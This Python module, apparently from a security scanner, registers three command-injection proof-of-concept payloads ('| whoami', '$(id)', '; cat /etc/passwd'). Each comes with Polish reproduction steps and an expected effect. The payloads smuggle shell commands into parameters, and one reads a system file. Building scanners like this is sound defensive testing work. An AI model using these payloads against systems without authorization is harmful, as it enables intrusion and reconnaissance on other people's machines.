"""Safe command-injection PoC payloads — Epic 4, Story 4.10.

Read-only commands (identity / file read) that prove command execution without
modifying the system. Destructive shell commands are blocked by the safety
validator.
"""

from app.services.security_scan.poc_payloads.registry import PayloadTemplate, register

_VULN = "command_injection"

register(
    _VULN,
    PayloadTemplate(
        label="whoami",
        payload="| whoami",
        reproduction_steps=(
            "1. Znajdź parametr przekazywany do polecenia powłoki.",
            "2. Dopisz: | whoami",
            "3. Obserwuj, czy odpowiedź zawiera nazwę użytkownika procesu.",
        ),
        expected_effect="Polecenie whoami wykonuje się i zwraca użytkownika, pod którym działa aplikacja — dowód wykonania komend.",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="id-substitution",
        payload="$(id)",
        reproduction_steps=(
            "1. Znajdź parametr trafiający do powłoki.",
            "2. Wprowadź: $(id)",
            "3. Obserwuj rozwinięcie podstawienia komend.",
        ),
        expected_effect="Podstawienie $(id) zwraca identyfikatory użytkownika/grupy procesu — potwierdza wykonanie komend.",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="read-passwd",
        payload="; cat /etc/passwd",
        reproduction_steps=(
            "1. Znajdź parametr przekazywany do polecenia systemowego.",
            "2. Dopisz: ; cat /etc/passwd",
            "3. Obserwuj, czy w odpowiedzi pojawia się zawartość pliku.",
        ),
        expected_effect="Odczyt /etc/passwd (tylko do odczytu) dowodzi wykonania dodatkowego polecenia bez modyfikacji systemu.",
    ),
)
